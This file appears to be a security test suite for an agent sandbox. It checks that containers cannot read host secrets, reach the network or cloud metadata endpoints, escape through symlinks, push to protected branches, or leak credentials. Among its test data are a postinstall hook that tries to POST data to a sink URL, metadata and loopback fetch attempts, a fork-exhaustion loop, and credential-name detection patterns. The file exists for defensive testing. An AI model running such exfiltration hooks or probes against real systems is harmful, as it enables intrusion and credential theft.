import { test, expect } from 'bun:test';
import { fixture, script, record, SecurityEnvironmentBlocked } from './fixture.js';

async function probe(caseId,run){
  let f;
  try{
    f=await fixture();
    // A positive control prevents denied dispatch being mistaken for OS isolation.
    const control=await f.exec(script("console.log(JSON.stringify({platform:process.platform,uid:process.getuid(),public:await Bun.file('/workspace/public.txt').text()}))"));
    expect(control.exitCode).toBe(0);
    expect(JSON.parse(control.stdout)).toMatchObject({platform:'linux',public:'Synthetic permitted workspace'});
    expect(JSON.parse(control.stdout).uid).not.toBe(0);
    const worker=f.worker();
    expect(worker.Config.Labels['odwyn.task']).toBe(f.job.id);
    expect(worker.Config.User).not.toMatch(/^(0|root)(:|$)/);
    expect(worker.Config.User).not.toBe('');
    expect(worker.HostConfig.Privileged).toBe(false);
    expect(worker.HostConfig.ReadonlyRootfs).toBe(true);
    expect(worker.HostConfig.NetworkMode).toBe('none');
    expect(worker.HostConfig.CapDrop).toContain('ALL');
    expect(worker.HostConfig.SecurityOpt.some(s=>s==='no-new-privileges'||s==='no-new-privileges:true')).toBe(true);
    expect(worker.Mounts.some(m=>m.Type==='bind')).toBe(false);
    const kernel=await json(f,"console.log(JSON.stringify({status:await Bun.file('/proc/self/status').text()}))");expect(kernel.status).toMatch(/^Seccomp:\s+2$/m);expect(kernel.status).toMatch(/^NoNewPrivs:\s+1$/m);expect(kernel.status).toMatch(/^CapEff:\s+0+$/m);
    const observations=await run(f,worker);
    record(caseId,'PASS',{...observations,positiveControl:true,nonRoot:true,readonlyRoot:true,noHostBinds:true,networkMode:'none',kernelSeccomp:2,kernelNoNewPrivileges:true,kernelEffectiveCapabilities:0});
  }catch(error){
    const blocked=error instanceof SecurityEnvironmentBlocked;
    record(caseId,blocked?'BLOCKED':'FAIL',{probeExecuted:!blocked,runnerAvailable:!blocked},blocked?error.message:'Actual probe assertion or fixture failed.');
    throw error;
  }finally{await f?.close();}
}
const json=async(f,code)=>{
  const result=await f.exec(script(code));expect(result.exitCode).toBe(0);expect(result.stdout).not.toContain(f.canary);return JSON.parse(result.stdout);
};
const deniedReads=paths=>`const fs=require('node:fs');const paths=${JSON.stringify(paths)};console.log(JSON.stringify(paths.map(p=>{try{fs.readFileSync(p);return {read:true}}catch(e){return {read:false,code:e.code}}})));`;

// Each catalog ID is a real executable case; unavailable infrastructure throws, never skips.
test('EXEC-001 Host secrets cannot be read',()=>probe('EXEC-001',async f=>{
  const reads=await json(f,deniedReads(f.hostPaths));expect(reads).toHaveLength(6);expect(reads.every(r=>!r.read)).toBe(true);
  expect(f.sinkCalls).toBe(0);expect(f.job.files).toHaveLength(0);
  expect(JSON.stringify(f.job)).not.toContain(f.canary);
  const audited=f.audit().filter(e=>e.action==='sandbox.exec'&&e.reason.startsWith('{')).map(e=>JSON.parse(e.reason));expect(audited.length).toBeGreaterThan(0);
  expect(audited.every(e=>/^[a-f0-9]{64}$/.test(e.commandSha256)&&e.wallMs>=0&&e.stdoutBytes>=0&&e.stderrBytes>=0&&e.exitCode===0)).toBe(true);expect(JSON.stringify(audited)).not.toContain(f.canary);expect(JSON.stringify(audited)).not.toContain(f.hostPaths[0]);
  return {hostOnlyReadsDenied:reads.length,sinkCalls:f.sinkCalls,exportedFiles:0,canaryDisclosed:false,commandDigestAndUsageAudited:true};
}),45000);

test('EXEC-002 Symlink and traversal',()=>probe('EXEC-002',async f=>{
  const paths=[...f.hostPaths,'/workspace/../space-b/private.txt','/proc/1/root'+f.hostPaths[0],'/workspace/host-link'];
  const setup=await f.exec(script(`require('node:fs').symlinkSync(${JSON.stringify(f.hostPaths[0])},'/workspace/host-link')`));expect(setup.exitCode).toBe(0);
  const reads=await json(f,deniedReads(paths));expect(reads.every(r=>!r.read)).toBe(true);
  return {traversalAndSymlinkReadsDenied:reads.length,canaryDisclosed:false};
}),45000);

test('EXEC-003 Network default deny',()=>probe('EXEC-003',async f=>{
  const result=await json(f,`let reached=false;try{await fetch(${JSON.stringify(f.sinkUrl)},{signal:AbortSignal.timeout(1000)});reached=true}catch{}console.log(JSON.stringify({reached}));`);
  expect(result.reached).toBe(false);expect(f.sinkCalls).toBe(0);
  expect(f.sinkPositiveControl).toBe(true);
  expect(f.audit().some(e=>e.action==='network.fetch'&&e.mode==='deny'&&e.reason.includes('OS network namespace'))).toBe(true);
  const routes=await json(f,"console.log(JSON.stringify({routes:await Bun.file('/proc/net/route').text()}))");expect(routes.routes.trim().split('\n')).toHaveLength(1);
  expect(f.store.security.simulate({agentId:f.job.agentId,spaceId:f.job.spaceId,resourceId:f.resource.id,action:'network.fetch'}).mode).toBe('deny');
  return {realRequestAttempted:true,sinkPositiveControl:true,sinkCalls:f.sinkCalls,networkGrantDenied:true,denialAudited:true,noKernelRoutes:true};
}),45000);

test('EXEC-004 Metadata/internal networks',()=>probe('EXEC-004',async f=>{
  const targets=[f.sinkUrl,'http://127.0.0.1:65534/control','http://[::1]:65534/control','http://169.254.169.254/latest/meta-data','http://10.0.0.1:65534/control'];
  const result=await json(f,`console.log(JSON.stringify(await Promise.all(${JSON.stringify(targets)}.map(async url=>{try{await fetch(url,{signal:AbortSignal.timeout(500)});return true}catch{return false}}))));`);
  expect(result.every(reached=>!reached)).toBe(true);expect(f.sinkCalls).toBe(0);
  return {metadataAndControlPlaneAttempts:targets.length,successfulRequests:0,sinkCalls:f.sinkCalls};
}),45000);

test('EXEC-005 Resource budgets',()=>probe('EXEC-005',async(f,w)=>{
  expect(w.HostConfig.Memory).toBeGreaterThan(0);expect(w.HostConfig.Memory).toBeLessThanOrEqual(128*1024*1024);
  expect(w.HostConfig.PidsLimit).toBeGreaterThan(0);expect(w.HostConfig.PidsLimit).toBeLessThanOrEqual(64);
  const cpu=w.HostConfig.NanoCpus||w.HostConfig.CpuQuota/w.HostConfig.CpuPeriod*1e9;expect(cpu).toBeGreaterThan(0);expect(cpu).toBeLessThanOrEqual(1e9);
  const kernel=await json(f,"const fs=require('node:fs');console.log(JSON.stringify(Object.fromEntries(['cpu.max','memory.max','pids.max'].map(k=>[k,fs.readFileSync('/sys/fs/cgroup/'+k,'utf8').trim()]))));");
  expect(kernel['cpu.max'].split(' ')[0]).not.toBe('max');expect(Number(kernel['cpu.max'].split(' ')[0])/Number(kernel['cpu.max'].split(' ')[1])).toBeLessThanOrEqual(1);
  expect(Number(kernel['memory.max'])).toBe(w.HostConfig.Memory);expect(Number(kernel['pids.max'])).toBe(w.HostConfig.PidsLimit);
  const started=Date.now(),busy=await f.exec(script('while(true){}'),200);expect(busy.timedOut).toBe(true);expect(Date.now()-started).toBeLessThan(5000);
  const second=await fixture();let oomKilled=false;
  try{
    const memory=await second.exec(script('const chunks=[];while(true)chunks.push(Buffer.alloc(8*1024*1024,1))'),10000);
    expect(memory.exitCode===0).toBe(false);expect(memory.timedOut).toBe(false);
    oomKilled=second.worker().State.OOMKilled;
    if(!oomKilled){const events=await json(second,"console.log(JSON.stringify({events:await Bun.file('/sys/fs/cgroup/memory.events').text()}))");oomKilled=Number(events.events.match(/^oom_kill (\d+)$/m)?.[1])>0;}
    expect(oomKilled).toBe(true);
  }finally{await second.close();}
  const third=await fixture();let forkDenied=false;
  try{
    const forks=await third.exec('i=0; while [ "$i" -lt 80 ]; do sleep 30 & i=$((i+1)); done; wait',1000);
    forkDenied=/Cannot fork|Resource temporarily unavailable/i.test(forks.stderr);
    expect(forkDenied).toBe(true);expect(forks.timedOut||forks.exitCode!==0).toBe(true);
    if(forks.timedOut)expect(third.worker().State.Running).toBe(false);
  }finally{await third.close();}
  expect(f.store.security.revision).toBeGreaterThan(0);
  return {cpuLimit:cpu,memoryLimit:w.HostConfig.Memory,pidsLimit:w.HostConfig.PidsLimit,forkExhaustionDenied:forkDenied,timeoutEnforced:busy.timedOut,memoryOOMKilled:true,controlPlaneAlive:true};
}),90000);

test('EXEC-006 Kill switch descendants',()=>probe('EXEC-006',async f=>{
  const childCode="const child=Bun.spawn(['sh','-c','sleep 300 & wait']);require('node:fs').writeFileSync('/workspace/children.json',JSON.stringify({parent:process.pid,child:child.pid}));await child.exited;";
  const running=f.exec(script(childCode),20000);let worker;
  for(let tries=0;tries<30;tries++){
    worker=f.worker();const ready=Bun.spawnSync(['docker','exec',worker.Id,'test','-f','/workspace/children.json']);
    if(ready.exitCode===0)break;
    if(tries===29)throw new Error('Child/grandchild positive control never started.');
    await new Promise(resolve=>setTimeout(resolve,100));
  }
  const before=Bun.spawnSync(['docker','top',worker.Id,'-eo','pid,ppid,args']);expect(before.exitCode).toBe(0);expect(before.stdout.toString()).toContain('sleep 300');
  const parallel=f.exec(script("require('node:fs').writeFileSync('/workspace/parallel.json','started');await new Promise(resolve=>setTimeout(resolve,300000));"),20000);
  for(let tries=0;tries<30;tries++){if(Bun.spawnSync(['docker','exec',worker.Id,'test','-f','/workspace/parallel.json']).exitCode===0)break;if(tries===29)throw new Error('Parallel execution never started.');await new Promise(resolve=>setTimeout(resolve,100));}
  await f.runtime.cancel(f.job.id);const stopped=await running;expect(stopped.cancelled).toBe(true);expect((await parallel).cancelled).toBe(true);
  const inspected=Bun.spawnSync(['docker','inspect',worker.Id]);
  if(inspected.exitCode===0)expect(JSON.parse(inspected.stdout.toString())[0].State.Running).toBe(false);
  expect((await f.invoke('odwyn_terminal',{resourceId:f.resource.id,command:'true',reason:'after cancel'})).success).toBe(false);
  return {childAndGrandchildObserved:true,parallelExecutionsCancelled:2,workerStopped:true,futureDispatchDenied:true,credentialsMounted:false};
}),45000);

async function push(f,ref){
  const result=await f.invoke('odwyn_repository_push',{resourceId:f.repository.id,ref});
  return result;
}
async function grantPush(f){
  const p=f.store.security;
  p.putAccess(f.job.agentId,{revision:p.revision,spaceIds:[f.job.spaceId],grants:[
    {spaceId:f.job.spaceId,resourceId:f.resource.id,action:'sandbox.exec',mode:'auto',constraints:{}},
    {spaceId:f.job.spaceId,resourceId:f.repository.id,action:'repository.branch.push',mode:'auto',constraints:{branchPrefixes:['agent/'],forbiddenRefs:['main','master','release/*','refs/tags/*'],denyWorkflowChanges:true}},
  ]});
  const commit=await f.exec("git -C /workspace checkout -b agent/fix && git -C /workspace -c user.name=Fixture -c user.email=fixture@example.invalid commit --allow-empty -m 'Synthetic agent commit'");expect(commit.exitCode).toBe(0);
}

test('EXEC-007 Scoped push permitted',()=>probe('EXEC-007',async f=>{
  expect((await f.exec("printf '\nSynthetic patch\n' >> /workspace/public.txt")).exitCode).toBe(0);
  const patch=await f.invoke('odwyn_repository_patch',{resourceId:f.resource.id});expect(patch.success).toBe(true);expect(patch.contentItems[0].text).toContain('Synthetic patch');
  const other=f.store.security.createResource({spaceId:f.job.spaceId,type:'workspace',name:'Different workspace'}),p=f.store.security;
  p.putAccess(f.job.agentId,{revision:p.revision,spaceIds:[f.job.spaceId],grants:[f.resource,other].map(r=>({spaceId:f.job.spaceId,resourceId:r.id,action:'sandbox.exec',mode:'auto',constraints:{}}))});
  expect((await f.invoke('odwyn_repository_patch',{resourceId:other.id})).success).toBe(false);
  await grantPush(f);const before=f.refs();const result=await push(f,'refs/heads/agent/fix');expect(result.success).toBe(true);
  const after=f.refs();expect(after).not.toBe(before);expect(after).toContain('refs/heads/agent/fix');
  expect(f.requests.some(r=>r.path.endsWith('/git-receive-pack'))).toBe(true);
  expect(JSON.stringify(result)).not.toContain(f.canary);
  const env=await json(f,"console.log(JSON.stringify({credentialKeys:Object.keys(process.env).filter(k=>/TOKEN|SECRET|API_KEY|SSH_AUTH_SOCK/.test(k))}))");expect(env.credentialKeys).toHaveLength(0);
  return {actualReceivePackObserved:true,allowedBranchCreated:true,credentialKeysInWorker:0,patchExportVerified:true,wrongWorkspacePatchDenied:true};
}),45000);

test('EXEC-008 Protected refs blocked',()=>probe('EXEC-008',async f=>{
  await grantPush(f);expect((await push(f,'refs/heads/agent/fix')).success).toBe(true);
  const before=f.refs(),calls=f.requests.length;
  for(const ref of ['refs/heads/main','refs/tags/v1','refs/heads/unrelated','refs/heads/release/test'])expect((await push(f,ref)).success).toBe(false);
  const changed=await f.exec("mkdir -p /workspace/.github/workflows && printf 'synthetic: true\n' > /workspace/.github/workflows/probe.yml && git -C /workspace add .github/workflows/probe.yml && git -C /workspace -c user.name=Fixture -c user.email=fixture@example.invalid commit -m 'Synthetic CI change'");expect(changed.exitCode).toBe(0);
  expect((await push(f,'refs/heads/agent/fix')).success).toBe(false);
  expect(f.refs()).toBe(before);expect(f.requests.length).toBe(calls);
  return {protectedRefAttempts:4,workflowChangeAttemptDenied:true,remoteRefsUnchanged:true,deniedUpstreamCalls:0};
}),45000);

test('EXEC-009 Dependency script exfiltration',()=>probe('EXEC-009',async f=>{
  const postinstall=`require('node:fs').writeFileSync('/workspace/postinstall-ran','yes');try{await fetch(${JSON.stringify(f.sinkUrl)},{method:'POST',body:'synthetic_marker',signal:AbortSignal.timeout(500)})}catch{}`;
  const setup=await f.exec(script(`const fs=require('node:fs');fs.mkdirSync('/workspace/dependency',{recursive:true});fs.writeFileSync('/workspace/dependency/package.json',JSON.stringify({name:'odwyn-probe',version:'1.0.0',scripts:{postinstall:${JSON.stringify(script(postinstall))}}}));fs.writeFileSync('/workspace/package.json',JSON.stringify({name:'fixture',dependencies:{'odwyn-probe':'file:./dependency'},trustedDependencies:['odwyn-probe']}));`));expect(setup.exitCode).toBe(0);
  const install=await f.exec('cd /workspace && bun install --offline',10000);expect(install.exitCode).toBe(0);
  const executed=await f.exec('cat /workspace/postinstall-ran');expect(executed.stdout.trim()).toBe('yes');expect(f.sinkCalls).toBe(0);
  return {actualPostinstallExecuted:true,deniedSinkCalls:0};
}),45000);

test('EXEC-010 No host socket or credentials',()=>probe('EXEC-010',async f=>{
  const result=await json(f,`const fs=require('node:fs');const sockets=['/var/run/docker.sock','/run/podman/podman.sock','/run/user/1000/docker.sock'];const hostReadable=${JSON.stringify(f.hostPaths)}.map(p=>{try{fs.readFileSync(p);return {read:true}}catch{return {read:false}}});console.log(JSON.stringify({sockets:sockets.map(p=>fs.existsSync(p)),credentialKeys:Object.keys(process.env).filter(k=>/TOKEN|SECRET|API_KEY|SSH_AUTH_SOCK|AWS_|AZURE_|GOOGLE_APPLICATION_CREDENTIALS/.test(k)),hostReadable}));`);
  expect(result.sockets.some(Boolean)).toBe(false);
  expect(result.credentialKeys).toHaveLength(0);expect(result.hostReadable.every(r=>!r.read)).toBe(true);
  return {hostSocketsPresent:0,credentialEnvironmentKeys:0,hostKeyReadsDenied:true};
}),45000);
